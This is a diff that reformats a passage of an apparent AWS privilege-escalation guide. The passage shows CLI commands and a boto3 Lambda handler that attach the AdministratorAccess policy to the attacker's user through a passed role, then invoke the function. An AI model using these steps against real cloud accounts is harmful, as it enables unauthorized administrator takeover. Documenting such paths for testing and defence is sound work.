@@ -231,19 +231,23 @@ This would give the attacker the privileges that are attached to any role in the
 
 **How to Exploit??**
 <p>An example set of commands to exploit this method might look like this:</p>
-<blockquote><p><em>aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py</em></p></blockquote>
+`aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py`
 <p>Where the code in the python file would utilize the targeted role. An example that uses IAM to attach an administrator policy to the current user can be seen here:</p>
-<blockquote><p>import boto3</p>
-<p>def lambda_handler(event, context):</p>
-<p>client = boto3.client(‘iam’)</p>
-<p>response = client.attach_user_policy(</p>
-<p>UserName=’my_username’,</p>
-<p>PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’</p>
-<p>)</p>
-<p>return response</p></blockquote>
-<p>After this, the attacker would then invoke the Lambda function using the following command:</p>
-<blockquote><p><em>aws lambda invoke –function-name my_function output.txt</em></p></blockquote>
-<p>Where output.txt is where the results of the invocation will be stored.</p>
+```
+import boto3
+def lambda_handler(event, context):
+client = boto3.client(‘iam’)
+response = client.attach_user_policy(
+	UserName=’my_username’, 
+	PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’)
+return response
+```
+After this, the attacker would then invoke the Lambda function using the following command:
+
+`aws lambda invoke –function-name my_function output.txt`
+
+Where output.txt is where the results of the invocation will be stored.
+
 
 **Potential Impact:**
 
